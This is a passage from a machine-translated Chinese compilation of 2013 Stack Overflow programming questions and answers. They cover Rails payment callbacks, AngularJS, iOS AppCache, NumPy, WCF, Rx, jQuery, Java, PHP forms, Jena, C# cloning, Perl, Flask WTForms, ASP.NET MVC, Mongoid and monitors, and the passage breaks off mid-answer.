    rescue
      redirect_to :root
      flash[:warning] = "You do not currently have any pending orders."
      return
    end
    @item = Item.find(@order.item_id)
    checkout_params = {
      :amount => @order.total.to_f,
      :short_description => "Order",
      :long_description => "Your order for #{@order.quantity} #{@item.name.pluralize(@order.quantity)} ",
    }
    init_checkout_and_send_user_to_wepay(checkout_params)
  end
end 
```

以及用户在返回时被重定向到的控制器：

```
class Purchase::FinalizeController < ApplicationController
  def index
    # Fetch the WepayCheckoutRecord that was stored for the checkout
    wcr  = WepayCheckoutRecord.find_by_checkout_id(params[:checkout_id])

    @order = Order.find(session[:order_id])
    @order.wepay_checkout_record = wcr
    @order.paid = true if wcr.state == 'authorized'
   @order.save

    redirect_to :root, :notice => "You have completed your purchase."
  end
end 
```

安全问题本身非常明显，如果您在订单中间更改会话 ID，则返回错误的订单会被批准。问题是 init_checkout_and_send_user_to_wepay 没有返回值，我无法立即将订单和结帐记录绑定在一起。我使用这个插件是错误的，还是只是遗漏了一些明显的东西？

谢谢大家的帮助！

# angularjs - 覆盖角度 forEach 中的属性

> ID：15936729
> 
> 赞同：3
> 
> 时间：2013-04-10T21:26:28.687
> 
> 标签：angularjs

我想这是一件容易的事，但我无法通过谷歌找到我正在寻找的信息。我有`popupProperties`这只是默认的东西。然后我调用根据弹出窗口返回特定覆盖的服务。如何遍历所有服务的覆盖并将它们应用于`popupProperties`？

```
var popupProperties = getDefaultPopupProperties();
var popupOverrides= popupService.getPopupOverrides(currPopupId);

angular.forEach(popupOverrides, function(popupProperty, propertyName){
    //replace defaults with popupData's properties
}); 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-11T03:39:27.647

You should have a look at the solution of **Josh David Miller** which uses the extend method of angular ([documentation](http://docs.angularjs.org/api/angular.extend)).

```
var defaults = {name:'John',age:17,weight:55};
var overrides = {name:'Jack',age:28,color:'brown'};
var props = angular.extend(defaults, overrides);

// result
props: {
    name:'Jack',
    age:28,
    weight:55,
    color:'brown'
} 
```

The values are copied in the defaults variable. There is no need of using the return value (var props =).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:38:21.367

我想您的意思是这两个函数都返回具有许多属性的对象（而不是数组）。

如果是这样，以下应该可以工作 - 只是 JavaScript，没有特定的 AngularJS：

```
for (var attrname in obj2) { obj1[attrname] = obj2[attrname]; } 
```

有关更多详细信息，请参阅此问题[如何动态合并两个 JavaScript 对象的属性？](https://stackoverflow.com/questions/171251/how-can-i-merge-properties-of-two-javascript-objects-dynamically)

# javascript - iOS 上的 AppCache 非常慢

> ID：15936730
> 
> 赞同：5
> 
> 时间：2013-04-10T21:26:35.857
> 
> 标签：javascript, ios, web-applications, application-cache

我正在开发一个使用应用程序缓存的网络应用程序，并且在桌面浏览器和 Android 上一切正常（即使是非常旧和慢速的 android 手机）。然而，在 Safari 和 Chrome 的 iOS 6 上下载 appcache 需要的时间要长得多。

我的应用程序缓存**总**大小只有 2.1Mb，而且我有一个非常稳定的 70Mbps（下载）互联网连接。我希望缓存会很快。

到目前为止，这是我的时间：

*   桌面 Chrome：**<1 秒** *（Safari 和 Firefox 的时间相似）*
*   Android 2.3.3 Stock Browser：**~4s** *（Chrome 和 Dolphin 的时间相似）*
*   Android 4.2.2（模拟）：**~7s**（在PhoneGap应用程序中运行）
*   iPhone 4S 6.0 Safari：**8 分钟！！！**（在 iOS Chrome 中也差不多！！）
*   iPad 2 6.0 Safari：**同上！！！**

所有这些设备都使用相同的 wifi 和互联网连接，我的 iPhone/iPad 运行良好（没有本地应用程序出现互联网速度问题，常规网站加载正常）。在 iOS 下似乎有一些东西绝对会降低 AppCache 的下载速度。

在`window.applicationCache.status`这段时间内`appCache.DOWNLOADING`，我有一个`progress`事件正在运行，在下载文件时对文件进行计数，所以我确定它没有卡在其他地方。这似乎只是下载所需的时间。是什么赋予了？

**附录**：iPhone 运行起来也非常热，并且在此操作过程中电池电量会很快下降。在此下载过程中，似乎有*什么东西*导致 CPU 完全耗尽。

（注意：由于我们仍处于私人测试阶段，因此我无法在此处发布指向网络应用程序的链接，但如果您需要先查看它，然后您认为您可以帮助诊断它，请发送电子邮件至我的个人资料中的地址，我将发送一个指向该应用程序的链接）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T23:33:14.987

好的，我在 iOS 模拟器和 Xcode Instruments 的帮助下解决了这个问题。（我不确定是否应该将我的解决方案添加到主要问题中，或者作为答案，但我想我会这样做，因为我的问题已经有点混乱了）。

事实证明，实际上是一些错误的 javascript 导致了这个问题，但显然只在 iOS 上。

该网络应用程序旨在仅是单页高（没有垂直滚动，除非在特定`DIV`s 内），因此除了用于隐藏地址栏的常用标准 JS 代码......

```
 window.addEventListener("load",function() {
            // Set a timeout...
            setTimeout(function(){
                // Hide the address bar!
                window.scrollTo(0, 1);
            }, 0);
        }); 
```

...我还添加了以下内容：

```
 $(document).scroll(
            function(e){
                window.scrollTo(0, 1);
            }); 
```

通过查看配置文件结果，我可以看到花费了*很多*时间`scrollTo`，因此它立即指出这是原因。为什么`scroll`事件被触发这么多，我不知道（这是在没有触摸屏幕的情况下发生的）。

我最初的解决方法是限制该代码，但我现在正在评估我是否需要它。这是我现在修复它的代码（使用[jquery-debounce](https://code.google.com/p/jquery-debounce/)，我已经将它用于其他东西）：

```
 $(document).scroll(
            $.throttle(function(e){
                window.scrollTo(0, 1);
            })
        , 10); 
```

应用缓存的下载时间现在与安卓时代一致。呸！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-21T10:17:34.430

代码正在进入一个**无限循环**，因为初始的 scrollTo 函数调用触发了滚动事件处理程序，然后它会反复重新触发自己！我最好的猜测是 iOS JavaScript 引擎处理这个无限循环的方式与其他浏览器的 JavaScript 引擎不同。

# python - 使用 Numpy 将空字符串转换为 0

> ID：15936732
> 
> 赞同：5
> 
> 时间：2013-04-10T21:26:46.663
> 
> 标签：python, numpy

我有一个 numpy 数组，其中每个元素看起来像这样：

```
['3' '1' '35' '0' '0' '8.05' '2']
['3' '1' '' '0' '0' '8.4583' '0']
['1' '1' '54' '0' '0' '51.8625' '2'] 
```

我想用一些默认值（如 0）替换所有空字符串，如上面第二行中的那些。我怎样才能用 numpy 做到这一点？

最终目标是能够运行 this: `S.astype(np.float)`，但我怀疑空字符串会导致转换出现问题。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-10T21:30:37.287

如果您的数组是 t：

```
t[t=='']='0' 
```

然后转换它。

**解释：**

`t==''``t`创建一个布尔数组，其形状与具有 True 值的形状相同，其中对应的`t`值是一个空格。然后使用这个布尔数组`'0'`仅分配给原始`t`.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-10T21:32:39.233

这是一种使用 map 的方法，它不会产生与调用 .astype() 相同的数据类型：

```
def FloatOrZero(value):
    try:
        return float(value)
    except:
        return 0.0

print map(FloatOrZero, ['3', '1', '', '0', '0', '8.4583', '0']) 
```

输出：

```
[3.0, 1.0, 0.0, 0.0, 0.0, 8.4583, 0.0] 
```

这种方法可能会让您更灵活地清理数据，但如果您想要使用 numpy.array，也可能更难推理。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-10T21:31:06.240

只需先这样做：

```
s = np.array(['1', '0', ''])
s[s==''] = '0'

s.astype(float)
#array([ 1.,  0.,  0.]) 
```

# wcf - 从 JQuery 调用 WCF 服务的 url 参数问题

> ID：15936734
> 
> 赞同：1
> 
> 时间：2013-04-10T21:26:50.243
> 
> 标签：wcf, web-services, jquery

我正在尝试从 Jquery 调用 WCF 服务。但是，如果我用我的机器名称替换 url，它就不起作用。html/jquery 和 WCF 都在同一个网站（项目）上。我认为很多人需要帮助，因为没有办法调试和找出问题。不是不断更改 wcf 服务文件、web.config 文件和 html（ajax 函数）页面，有没有人有一个正在运行的项目有这个问题？

```
 $.ajax({
        type: "POST",

        //work well 
        //url: "Service1.svc/MyFunction",

        //work well
        //url: "http://localhost:43969/Service1.svc/MyFunction",

        //not work ???
        //url: "http://PWLL-IT-056:43969/Service1.svc/MyFunction",

        data: '{"Count": "' + counter + '"}',
        contentType: "application/json", // content type sent to server
        success: ServiceSucceeded,
        error: ServiceFailed
    }); 
```

谢谢各位帮忙，

# .net - 通知时间戳 & IsStarted 从 ReplaySubject

> ID：15936736
> 
> 赞同：1
> 
> 时间：2013-04-10T21:26:53.940
> 
> 标签：.net, system.reactive

在订阅时，我的 ReplaySubject 订阅者想知道重播历史何时结束并成为“实时”订阅。此外，所述订阅者还希望接收每个项目的通知时间。

我认为唯一的方法是复制 ReplaySubject 源并使其返回一个包含时间戳的对象和一个指示 RemovableDisposable.IsStarted 状态的布尔值？

除非有人能提出更好的选择？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T09:00:58.423

您的重播主题提供的每个项目都应该是一个包含时间戳的包装项目（指示其首次创建时的原始时间）。不要将此与 Observable.TimeStamp() 运算符混淆，后者将为您提供每个通知的最新（实时）时间戳。相反，您希望在项目第一次通过主题播放时记录时间戳，并为任何未来的订阅者重播相同的时间戳。即如果你的 observable 当前是

```
IObservable<T>, you could change it to be IObservable<TimeStamped<T>>, 
```

使用您自己的自定义 Monad，Rx 'Timestamped' 之一，（或者如果您愿意，也可以只是一个简单的包装类开始）。

一旦你有了这个，我会认为这两个要求都非常简单，但你不需要“布尔”。

相反，您的订阅者可以缓存他们自己的时间戳，代表订阅时间。然后您可以定义：

*   IsAReplayedItem =subscriberTimeStamp >= T.TimeStamp

*   IsALiveItem =subscriberTimeStamp < T.TimeStamp

在我看来，这使它更简单。让主题告诉您它是否已重播/直播（而不是客户端通过比较时间戳来解决）的唯一方法是编写您自己的自定义重播主题。这将 'OnSubscribe' 提供一个新的观察者及其缓存项目，用 'bool = true' 包装在一个类中，然后是 'OnNext' 中的任何未来项目，以及 'bool = false'。但是，您需要： a) 缓存以前的项目 b) 缓存订阅者 c) 管理处理更新的相当多的复杂性，同时将初始缓存重播给订阅者（有效地维护每个订阅者的缓存）。

这让我觉得要复杂得多，没有真正的好处。保持简单，只需使用时间戳即可。

霍华德·安德烈西耶

ps 可以通过将 ReplaySubject 包装在容器类中来解决“IsStarted”要求。此类可以公开底层 IObservable，但也可以维护自己的订阅，当它观察到它的第一项时，它将本地 bool 'IsStarted' 设置为 true。然后，外部呼叫者可以使用主题，或随时评估“IsStarted”布尔值。

# javascript - 如何在这段 jQuery 中访问“点击”的状态

> ID：15936740
> 
> 赞同：1
> 
> 时间：2013-04-10T21:27:09.253
> 
> 标签：javascript, jquery

我有这段 jQuery。`#mydiv`是否可以从这段代码之外确定元素是否已被“单击”。

[JSFIDDLE](http://jsfiddle.net/byronyasgur/BxF9R/)

```
$.fn.clicktoggle = function(a, b) {
    return this.each(function() {
        var clicked = false;
        $(this).bind("click", function() {
            if (clicked) {
                clicked = false;
                return b.apply(this, arguments);
            }
            clicked = true;
            return a.apply(this, arguments);
        });
    });
};

function odd() {
    alert("odd");
}

function even() {
    alert("even");
}

$("#mydiv").clicktoggle(even, odd); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:31:13.817

> 是否可以确定 #mydiv 元素是否已从这段代码外部“单击”。

不，据我从您引用的代码中可以看出，该信息仅存储在函数调用的执行上下文中包含的`clicked`变量（`each`迭代器函数中的变量）中。该信息对于该上下文是完全私有的。

修改代码以使信息可用是很容易的。例如：

```
$.fn.clicktoggle = function(a, b) {
    return this.each(function() {
        var $this = $(this);
        $this.bind("click", function() {
            if ($this.attr("data-clicked")) {
                $this.attr("data-clicked", "");
                return b.apply(this, arguments);
            }
            $this.attr("data-clicked", "Y");
            return a.apply(this, arguments);
        });
    });
}; 
```

[更新小提琴](http://jsfiddle.net/BxF9R/7/)

在那里，我们不是将状态存储在`clicked`变量中，而是将其存储为`data-clicked`元素上的属性（`""`如果未单击，则为 [a “falsey” value]，如果单击，`"Y"`则为 [a “truthy” value]）。然后，您可以通过执行以下操作从外部了解其状态：

```
if ($("#mydiv").attr("data-clicked")) {
    // It has the "clicked" state
}
else {
    // It has the un-"clicked" state
} 
```

但是，如果信息完全存储在变量中，就像您显示的代码一样，那么该信息对“外部”是完全隐藏的。

# java - Java中VirtualKey代码的奇怪行为

> ID：15936742
> 
> 赞同：0
> 
> 时间：2013-04-10T21:27:12.750
> 
> 标签：java, hashmap, ascii, keyevent, awtrobot

我正在从手机获取键盘输入，并尝试使用机器人类在计算机上显示它。由于我从电话中获得了 ascii，因此我有一个用于将 ascii 转换为 VirtualKey 值的哈希图。但是我当前的代码有一些奇怪的行为。当我尝试在哈希图中映射某些符号时，例如！“'@我在运行它时得到一个 NullPointer Reference 异常。例如，对于 ! ，电话发送正确的 unicode 值 (33) 并且在哈希表中我有 (int)'！' 作为键，也是 33。所以它应该返回 VK_EXCLAMATION 这是它映射到的内容，但它返回 null :( 有人可以帮忙吗？

这是我在进行查找时截取的代码：

```
int unicodekey = scanner.nextInt(); //unicode
    robotkey = ascii2VK.asciiForVirtualKey.get(unicodekey);
    robot.keyPress(robotkey);
    robot.keyRelease(robotkey); 
```

我的哈希图看起来像这样：

```
public class ascii2VK {
      protected static final Map<Integer, Integer> asciiForVirtualKey;
            static {
                asciiForVirtualKey = new HashMap<Integer, Integer>();
                asciiForVirtualKey.put(KeyEvent.VK_UNDEFINED, 0);
                asciiForVirtualKey.put(KeyEvent.VK_QUOTE, (int)'\'');
                asciiForVirtualKey.put(KeyEvent.VK_QUOTEDBL,(int)'"');
                asciiForVirtualKey.put(KeyEvent.VK_AMPERSAND, (int)'&');
                asciiForVirtualKey.put(KeyEvent.VK_BACK_QUOTE, (int)'`');
                asciiForVirtualKey.put(KeyEvent.VK_NUMBER_SIGN, (int)'#');
                asciiForVirtualKey.put(KeyEvent.VK_EXCLAMATION_MARK, (int)'!');
                asciiForVirtualKey.put(KeyEvent.VK_AT, (int)'@');
                asciiForVirtualKey.put(KeyEvent.VK_DOLLAR, (int)'$');
                asciiForVirtualKey.put(KeyEvent.VK_BACK_SLASH, (int)'\\');
                asciiForVirtualKey.put(KeyEvent.VK_SLASH, (int)'/');
    .
    .
    .
    .
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:38:23.770

您应该反转地图中的键和值。

KeyEvent.VK_EXCLAMATION_MARK 是常量，值为 0x0205（十进制 517）。但是你尝试通过33码找到它，实际上是（int）'！'

这将是正确的顺序：

```
asciiForVirtualKey.put((int)'!', KeyEvent.VK_EXCLAMATION_MARK); 
```

等等。

# php - if (!empty ($_POST)) 不工作

> ID：15936748
> 
> 赞同：0
> 
> 时间：2013-04-10T21:27:30.510
> 
> 标签：php, post

我有这个表格，但我的 $_POST 数据无法通过：

形式：

```
<form action="" id="contact-form" method="post">

           <input id="nombre" size="16" type="text" placeholder="Nombre">

           <input id="email" size="16" type="text" placeholder="Email">

           <textarea id="texto"></textarea>

           <input type="submit" value="Enviar"> 
```

PHP：

```
<?php

 if(!empty($_POST) {

 echo "YES";

 } else {

 echo "NO";

 }

?> 
```

当我完成并提交所有字段时，它总是回显“否”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:33:07.157

您错过了`name`输入字段的属性。更改您的 html 并添加它们：

```
<form action="" id="contact-form" method="post">
    <input id="nombre" name="nombre" size="16" type="text" placeholder="Nombre">
    <input id="email" name="email" size="16" type="text" placeholder="Email">
    <textarea id="texto" name="texto"></textarea>
    <input type="submit" value="Enviar"> 
```

请注意，该`id`属性不是必需的。如果您不需要它用于其他目的（例如在样式表或 javascript 中使用它），则可以省略它。为了简单地发送表单，只`name`需要属性

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:36:57.810

如果您想要特定字段，请尝试：

```
if(isset($_POST['field']{0})){ 
```

如果要检查多个字段 POST，请尝试：

```
if(count($_POST)>0){ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:34:52.030

您的输入应该具有`name`属性集，它将它们设置在 $_POST 数组中。`id`在张贴表格中被忽略！

```
<input id="nombre" size="16" type="text" placeholder="Nombre" name="nombre"> 
```

你会得到它 $_POST['nombre']

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T21:37:01.247

这是另一种解决方案，如果您在输入中添加***“名称”***属性，它应该可以工作：

```
 if (count($_POST) == 0)  {

         echo "YES";
    }
  else {

         echo "NO";

       } 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-10T21:39:59.793

您需要指定一个变量， `$_POST['email']`例如。尝试所有领域；

`if(!empty($_POST['Nombre']) && !empty( $_POST['email']) && !empty ( $_POST['texto'])) { ...`

对不起，我在移动设备上，让所有拼写正确都很难。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2018-05-15T09:22:19.610

```
if (empty($_POST['qty'])) {
    echo "<script>alert('inputan Quality tidak boleh kosong');history.go(-1);</script>";
} 
else {
    ...
} 
```

所以没有验证错误，这里我使用数组

# list - 列出 Jena 中实例的对象资源

> ID：15936758
> 
> 赞同：0
> 
> 时间：2013-04-10T21:27:59.757
> 
> 标签：list, rdf, jena, ontology

如何列出与 Jena 中的 Resource 实例关联的所有对象资源？

例如：**Micheal**有一个名为“ **Ben ”的 Object Resource，它是 Resource** **Person**的一个实例

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T03:58:15.160

**对象资源**引用什么？**人**重要吗？

如果您的意思是与**Micheal**有对象关系的对象，那么您通过资源的**ListProperties**检索它们，从而获取这些属性的对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T12:27:45.747

请参阅在线 Apache Jena javadoc：

[http://jena.apache.org/documentation/javadoc/jena/](http://jena.apache.org/documentation/javadoc/jena/)**

# c# - C#如何克隆列表列表

> ID：15936759
> 
> 赞同：0
> 
> 时间：2013-04-10T21:28:00.890
> 
> 标签：c#, clone

我有类属性和值。我不知道如何克隆列表中的项目值。

```
public class Attribut : ICloneable
{
    public Attribut()
    { }

    public Attribut(List<Values> value)
    {
        this.Values = value;
    }

    public object Clone()
    {
        return this.MemberwiseClone();
    }

   //other members

    List<Values> values = new List<Values>();y

    public List<Values> Values
    {
        get { return values; }
        set { values = value; }
    }
}

[Serializable]
public class Values : ICloneable
{
    public Values()
    {
    }

    public Values(string name)
    {
        this.Name = name;
    }

    public Values(string name, int count)
    {
        this.Name = name;
        this.Count = count;
    }

    public object Clone()
    {
        return this.MemberwiseClone();
    }

    string name;

    int count = 0;

    public int Count
    {
        get { return count; }
        set { count = value; }
    }

    public string Name
    {
        get { return name; }
        set { name = value; }
    }
} 
```

当我调用此方法时克隆值有问题（attrList）是全局变量）当我将新值添加到列表中时，同样的值也会添加到 attrList 中。

```
private List<Attribut> getSelectedColumns()
    {
        List<Attribut> list = new List<Attribut>();

        for (int i = 0; i < listView1.Items.Count; i++)
        {
            if (listView1.Items[i].Checked == true)
            {
                list.Add((Attribut)attrList[i].Clone());
                for(int j= 0; j < attrList[i].Values.Count;j++)
                {
                    list[j].Values.Add((Values)attrList[i].Values[j].Clone());
                }
            }
        } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T10:01:38.023

我认为首先您需要了解**浅拷贝**和**深拷贝**之间的区别。

简而言之，第一个只是复制引用（从而使两个对象引用相同的列表），而第二个创建“真实副本”。

因此，`MemberwiseClone`创建了**shallow copy**，而您似乎需要**deep copy**。

在大多数情况下，**深度复制**需要自定义编程，因为只有您知道如何正确创建不同的对象（使用哪些构造函数、复制哪些属性、分配哪些资源等）。

例如，如果您的对象拥有一个文件处理程序，则由您和您的逻辑决定是否需要在克隆对象之间共享此文件，或者实际克隆文件本身。

因此，在您的情况下，最有可能的深层副本`List<Value>`应该如下所示：

```
 public object Clone()
    {
        var result = (Attribut)MemberwiseClone();
        result.values = values.Select(x => (Values)x.Clone()).ToList();
        return result;
    } 
```

请务必为您不想在克隆之间共享的所有列表/对象反映此深层复制逻辑。

# perl - 在perl中一次处理多个文件？

> ID：15936761
> 
> 赞同：1
> 
> 时间：2013-04-10T21:28:07.387
> 
> 标签：perl, parsing

我有一个 perl 脚本，它打开一个 txt 文件，对其进行解析，以便将适当的文本输出到 csv 文件。我现在为一个文件工作得很好，但我有很多类似的文件要以完全相同的方式处理。我希望能够自动执行此操作，因此代码将通过 file1.txt 运行并解析我想要 output.csv 的文本，然后通过 file2.txt 运行并将此输出附加到相同的 output.csv 中。我在下面包含了我的代码的相关位，仅排除了在 while 循环中进行实际解析的代码，因为我不需要更改它。输入文件的名称一致，例如 file1.txt、file2.txt、file3.txt 等，并且都位于同一目录中

```
my $mode = "none";
open(my $infile,"<","file1.txt") or die $!;
open (my $outfile,">>","output.csv") or die $!;
while (<$infile>)
{
    chomp; 
    if ($_ =~ /^Section 1/) {
        $mode = "sec1";
    }
    if ($_ =~ /^Section 2/) {
        $mode = "sec2";
    }

    if ($mode =~ "sec1") {
      $_=~ tr/,//d;

      if ($_ =~ /.\%$/){
        print $outfile $_;
        print $outfile "\n";
      }
      else{
        print $outfile $_;  
      }

    }    
}

close $infile;
close $outfile; 
```

输出文件应该类似于这个（显然不是这个文本，我只是强调它必须附加输出，我想我已经通过使用 >> 而不是 >）

```
this is from file 1
this is from file 2
this is from file 3 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:32:07.933

您只需要将其包装在一个循环中，如下所示：

```
for my $file ( @list_files ) {
    open $in_fh, "<", $file;
    while (my $line = <$in_fh>) {
    # and the rest of your stuff goes here 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:42:24.267

您可以使用*菱形运算符* `<>`和标量`$ARGV`变量：

```
use strict; use warnings;

while (<>) {
    print "Processing [$_] from $ARGV\n";
} 
```

这和

```
use strict; use warnings;

while (<ARGV>) {
    print "Processing [$_] from $ARGV\n";
} 
```

如果里面有东西`@ARGV`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T23:26:05.380

只需将必要的文件放入`@ARGV`，就好像它们是在命令行上键入的一样。然后从`ARGV`文件句柄中读取。

```
use strict;
use warnings;

our @ARGV = do {
    opendir my $dh, '.' or die $!;
    grep /^file\d+\.txt$/, readdir $dh;
};

while ( <ARGV> ) {
  ...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T21:40:08.663

很容易打开命令行中给出的所有文件。有一个特殊的文件句柄，称为`ARGV`.

例子：

```
#!/usr/bin/perl

use strict;
use warnings;

while (<ARGV>) {
    print $_;
} 
```

命令行：

```
test.pl file*.txt 
```

所有文件都将被连接起来。

如果您在代码“内部”有文件列表，则可以将它们加载到`@ARGV`数组中，然后使用`<ARGV>`.

# python - 当我将 POST 与 Flask 一起使用时，我遇到了 wtforms 选择字段的问题

> ID：15936764
> 
> 赞同：23
> 
> 时间：2013-04-10T21:28:19.847
> 
> 标签：python, flask, wtforms, flask-wtforms

我对 wtforms 和烧瓶很陌生，并且在使用 selectfields 时遇到了错误。表单本身在没有选择字段的情况下工作得很好，但有了它我得到以下错误：

**错误：**

```
....fields.py", line 386, in pre_validate
    for v, _ in self.choices: TypeError: 'NoneType' object is not iterable 
```

我看到了选择字段，所以它正在被渲染。我怀疑在 POST 上没有正确验证 id 并且没有返回任何内容。或者它与我返回的选择字段元组有关？此外，我使用的 ID 字段是从 GAE 的 ndb 自动 key().id() 中提取的，它相当长且令人讨厌。可能是用于选择字段的 id 长度太长？

谷歌搜索并没有提供太多关于确切问题的信息，所以我想我会在这里发布。相关代码如下。如果我遗漏了什么，请告诉我

**view.py 代码：**

```
@app.route('/new/post', methods = ['GET', 'POST'])
@login_required
def new_post():

    form = PostForm()
    if form.validate_on_submit():
        post = Post(title = form.title.data,
                    content = form.content.data,
                    hometest = form.hometest.data,
                    author = users.get_current_user())
        post.put()
        flash('Post saved on database.')
        return redirect(url_for('list_posts'))
    form.hometest.choices = [ (h.key.id(),h.homename)for h in Home.query()]

    return render_template('new_post.html', form=form) 
```

**我的表格.py**：

```
class PostForm(Form):
    title = wtf.TextField('Title', validators=[validators.Required()])
    content = wtf.TextAreaField('Content', validators=[validators.Required()])
    hometest = wtf.SelectField(u'Home Name List', coerce=int,validators=[validators.optional()]) 
```

**new_post.html：**

```
{% extends "base.html" %}

{% block content %}
    <h1 id="">Write a post</h1>
    <form action="{{ url_for('new_post') }}" method="post" accept-charset="utf-8">
        {{ form.csrf_token }}
        <p>
            <label for="title">{{ form.title.label }}</label><br />
            {{ form.title|safe }}<br />
            {% if form.title.errors %}
            <ul class="errors">
                {% for error in form.title.errors %}
                <li>{{ error }}</li>
                {% endfor %}
            </ul>
            {% endif %}
        </p>
        <p>
            <label for="title">{{form.hometest.label}}</label><br/>
            {{form.hometest}}
            {% if form.hometest.errors %}
        <ul class="errors">
            {% for error in form.hometest.errors %}
            <li>{{ error }}</li>
            {% endfor %}
        </ul>
        {% endif %}
        </p>
        <p>
            <label for="title">{{ form.content.label }}</label><br />
            {{ form.content|safe }}<br />

            {% if form.content.errors %}
            <ul class="errors">
                {% for error in form.content.errors %}
                <li>{{ error }}</li>
                {% endfor %}
            </ul>
            {% endif %}
        </p>
        <p><input type="submit" value="Save post"/></p>
    </form>
{% endblock %} 
```

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-04-11T02:10:59.693

您需要在调用*之前*`validate_on_submit`设置您的选择，因为`form.validate`它将尝试根据选择列表（`None`在您设置之前）验证提供的值（如果有`choices`）：

```
form = PostForm()
form.hometest.choices = [(h.key.id(), h.homename) for h in Home.query()]

if form.validate_on_submit():
    # form is valid, continue 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-10T22:47:02.910

你应该提供 `choices=[...]`论据，比如

```
wtf.SelectField(u'Home Name List',
                choices=[(1, 'Label 1'),
                         (2, 'Label 2')],
                coerce=int,
                validators=[validators.optional()]) 
```

# asp.net-mvc - MVC 4 _Layout.cshtml 视图模型

> ID：15936768
> 
> 赞同：8
> 
> 时间：2013-04-10T21:28:50.767
> 
> 标签：asp.net-mvc, razor

我想在我的 MVC 站点的每个页面上显示所选项目的计数。我有一个 ViewModel 定义了我想要的属性

```
public class CartViewModel
{
    public List<CartItem> CartItems { get; set; }
    public decimal CartTotal { get; set; }
} 
```

获取 Cart 的控制器，将其映射到视图模型并将其传递给

```
public ActionResult GetCartSummary()
{
    var cart = Cart.Instance;
    var viewModel = AutoMapper.Mapper.Map<Cart, CartViewModel>(cart);
    return View(viewModel);
} 
```

以及对此的看法

```
@model TheWorkshop.Web.Models.Edit.ShoppingCartViewModel

<h2>Cart Summary</h2>
<span>@Model.CartTotal</span> 
```

最后在我的`_Layout.cshtml`文件中

```
@Html.Action("GetCartSummary", "Cart") 
```

但这给了我

> System.StackOverflowException 未处理

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:30:10.580

尝试将以下内容添加到您的购物车视图中：

```
@{Layout = null;} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-10T21:31:40.260

尝试返回 PartialView 而不是 View：

```
public ActionResult GetCartSummary()
{
    var cart = Cart.Instance;
    var viewModel = AutoMapper.Mapper.Map<Cart, CartViewModel>(cart);
    return PartialView(viewModel);
} 
```

# ruby-on-rails - Mongoid - 如何创建包含嵌入文档的文档？

> ID：15936770
> 
> 赞同：0
> 
> 时间：2013-04-10T21:29:23.477
> 
> 标签：ruby-on-rails, mongoid

我目前正在使用 Mongoid 进行 Rails 项目。我`Game`定义了一个模型，其中嵌入了许多`GamePlayers`. 不幸的是，我不知道如何创建新游戏。我可以使用 来创建没有玩家的游戏`Game.create`，但是当我也尝试为游戏创建玩家时，它会出现语法错误。我已经尝试在线搜索，但我无法找到任何与问题相关的内容。

这是我在`GamesController`.

```
 def new
    @game = Game.create(
        epoch: 1,    
        turn: 0,
        auction_turn: -1,
        auction_type: -1,
        sun: 1,
        ras: 0,
        auction_track: []

        game_players: [ #doesn't work
          { suns:[9,6,5,2]
          }        
        ]      
    )

    redirect_to :action => "show", :id => @game._id
  end 
```

产生错误

```
/home/<redacted>/Ra/ra_server/app/controllers/games_controller.rb:36: syntax error, unexpected tIDENTIFIER, expecting ')'
        game_players: [ #doesn't work 
```

这是我的模型

```
class Game
  include Mongoid::Document

  field :epoch, type:Integer
  field :turn, type:Integer
  field :auction_turn, type:Integer
  field :auction_type, type:Integer
  field :sun, type:Integer
  field :ras, type:Integer
  field :auction_track, type:Array

  embeds_many :game_players 
end

class GamePlayer
  include Mongoid::Document

  field :score, type:Integer
  field :bid, type:Integer
  field :suns, type:Array
  field :next_suns, type:Array
  field :pharaohs, type:Integer
  field :niles, type:Integer
  field :floods, type:Integer
  field :gods, type:Integer
  field :gold, type:Integer
  field :civilizations, type:Array
  field :monuments, type:Array

  embedded_in :game
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:56:05.087

您的参数中的auction_track: [] 之后似乎缺少逗号。

# multithreading - 监视器同步如何工作？

> ID：15936771
> 
> 赞同：0
> 
> 时间：2013-04-10T21:29:31.147
> 
> 标签：multithreading, process, synchronization, semaphore, monitor

因此，我正在阅读有关**同步**的内容并遇到过**Monitors**，但似乎无法掌握它们的工作原理。

我看到一般布局是以下格式的东西，我可以看到**条件变量**（我不确定这些是做什么的）：

```
monitor {
    // shared variables
    procedure P1 (..) {..}
    ...
    procedure P2 (..) {..}
    initialisation code (..) {..}
} 
```

但是，尽管我对此一头雾水，但我看不出真正看到像所描述的那样的监视器**如何**一次只允许一个进程访问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:54:01.383

我喜欢将监视器视为具有私有互斥锁的对象，并且每个过程都受到该互斥锁的保护。所以像：

```
MyClass {
  // private shared variables
  ...
  mutex m;
  // public procedures
